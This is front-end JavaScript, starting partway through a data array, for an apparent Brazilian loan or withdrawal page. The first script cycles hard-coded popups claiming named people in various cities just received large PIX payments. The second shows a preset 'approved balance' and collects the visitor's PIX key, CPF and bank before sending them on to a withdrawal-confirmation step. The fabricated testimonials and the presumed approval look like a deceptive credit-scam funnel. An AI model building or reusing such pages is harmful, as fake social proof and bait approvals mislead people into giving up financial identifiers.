<script>

        { name: "Tatiane P.", city: "Curitiba", amount: 8700.00, message: "Acabou de receber R$" },
        { name: "Carla S.", city: "Salvador", amount: 21450.00, message: "Foi aprovada e recebeu R$" },
        { name: "Rogério F.", city: "Belo Horizonte", amount: 9400.00, message: "Recebeu via PIX R$" },
        { name: "Patrícia M.", city: "Fortaleza", amount: 11800.00, message: "Conseguiu o crédito de R$" },
        { name: "André R.", city: "São Paulo", amount: 15200.00, message: "Acabou de receber R$" },
        { name: "Vanessa C.", city: "Brasília", amount: 20500.00, message: "Foi aprovada e recebeu R$" },
        { name: "João P.", city: "Recife", amount: 9700.00, message: "Recebeu via PIX R$" },
    ];

    let currentNotification = 0;
    const container = document.querySelector('[data-testid="live-notification"]');
    const nameEl = container.querySelector('h4');
    const cityEl = container.querySelector('span');
    const amountEl = container.querySelector('p');
    const progressEl = container.querySelector('.bg-green-500');

    function formatCurrencyNoti(value) {
        return value.toLocaleString("pt-BR", {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2,
        });
    }

    function showNotification() {
        const n = notifications[currentNotification];

        nameEl.textContent = n.name;
        cityEl.textContent = `de ${n.city}`;
        amountEl.innerHTML = `${n.message} ${formatCurrencyNoti(n.amount)}`;

        container.classList.remove("translate-y-full", "opacity-0");
        container.classList.add("translate-y-0", "opacity-100");

        progressEl.style.transition = "none";
        progressEl.style.width = "100%";
        void progressEl.offsetWidth;

        progressEl.style.transition = "width 5s linear";
        progressEl.style.width = "0%";

        setTimeout(() => {
            container.classList.add("translate-y-full", "opacity-0");
            container.classList.remove("translate-y-0", "opacity-100");
        }, 5000);

        currentNotification = (currentNotification + 1) % notifications.length;
    }

    setTimeout(showNotification, 5000);
    setInterval(showNotification, 15000);

<script>
    const BANKS = ["Banco do Brasil","Banco Bradesco","Caixa Econômica Federal","Itaú Unibanco","Santander Brasil","Banco Inter","Nubank","Banco Safra","Banco Original","Banco Pan","BTG Pactual","C6 Bank","Banco BMG","Banco Votorantim","Banco Mercantil","Banco Pine","Banco Rendimento","Banco Daycoval","Banco Sofisa","Banco Ficsa","Banco BS2","Banco PagSeguro","Banco Next","Neon Pagamentos","Banco Modal","Banco Agibank","Banco Cooperativo Sicredi","Banco Cooperativo do Brasil","PicPay","Mercado Pago"];

    let pixType = "cpf";

    function formatCPF(v) {
        v = v.replace(/\D/g, "");
        return v.replace(/(\d{3})(\d)/, "$1.$2")
                .replace(/(\d{3})(\d)/, "$1.$2")
                .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    }

    function formatPhone(v) {
        v = v.replace(/\D/g, "");
        if (v.length <= 10) return v.replace(/(\d{2})(\d{4})(\d+)/, "($1) $2-$3");
        return v.replace(/(\d{2})(\d{5})(\d+)/, "($1) $2-$3");
    }

    function updatePixLabel() {
        const label = {
            cpf: "Digite seu CPF",
            telefone: "Digite seu Telefone",
            email: "Digite seu E-mail",
            aleatoria: "Digite sua Chave Aleatória"
        }[pixType];

        document.getElementById("pixLabel").innerText = label;
    }

    document.addEventListener("DOMContentLoaded", () => {
        let user = sessionStorage.getItem("userData");
        user = user ? JSON.parse(user) : null;
        const valor = user?.valorDesejado ?? 20000;

        document.getElementById("saldoAprovado").innerText =
            "R$ " + valor.toLocaleString("pt-BR", {minimumFractionDigits: 2,maximumFractionDigits: 2,});

        document.getElementById("amountSaque").innerText =
            "R$ " + valor.toLocaleString("pt-BR", {minimumFractionDigits: 2,maximumFractionDigits: 2,});

        if (user?.CPF) {
            document.getElementById("pixKeyInput").value = formatCPF(user.CPF);
        }

        document.querySelectorAll("input[name='pixType']").forEach(el => {
            el.addEventListener("change", function () {
                pixType = this.value;
                updatePixLabel();

                const input = document.getElementById("pixKeyInput");
                input.value = "";
                input.maxLength = pixType === "cpf" ? 14 :
                                  pixType === "telefone" ? 15 : 200;

                const placeholder = {
                    cpf: "000.000.000-00",
                    telefone: "(00) 00000-0000",
                    email: "seu@email.com",
                    aleatoria: "Digite a chave aleatória"
                }[pixType];

                input.placeholder = placeholder;
            });
        });

        document.getElementById("pixKeyInput").addEventListener("input", e => {
            if (pixType === "cpf") e.target.value = formatCPF(e.target.value);
            if (pixType === "telefone") e.target.value = formatPhone(e.target.value);
        });

        document.getElementById("bankSearch").addEventListener("input", e => {
            const val = e.target.value.toLowerCase();
            const list = BANKS.filter(b => b.toLowerCase().includes(val));

            const box = document.getElementById("bankList");
            box.innerHTML = "";
            box.classList.toggle("hidden", list.length === 0);

            list.forEach(b => {
                const btn = document.createElement("button");
                btn.className = "w-full px-4 py-3 border-b text-left hover:bg-gray-50";
                btn.innerText = b;
                btn.onclick = () => {
                    e.target.value = b;
                    box.classList.add("hidden");
                };
                box.appendChild(btn);
            });
        });

        document.getElementById("btnSacar").addEventListener("click", () => {
            const key = document.getElementById("pixKeyInput").value;
            const bank = document.getElementById("bankSearch").value;

            if (!key || !bank) return;

            sessionStorage.setItem("withdrawalData", JSON.stringify({
                valor,
                pixKeyType: pixType,
                pixKey: key,
                bank,
                userName: user?.NOME ?? "Usuário",
                userCpf: user?.CPF ?? ""
            }));

            window.location.href = "saque/confirmar.html";
        });
    });
</script>
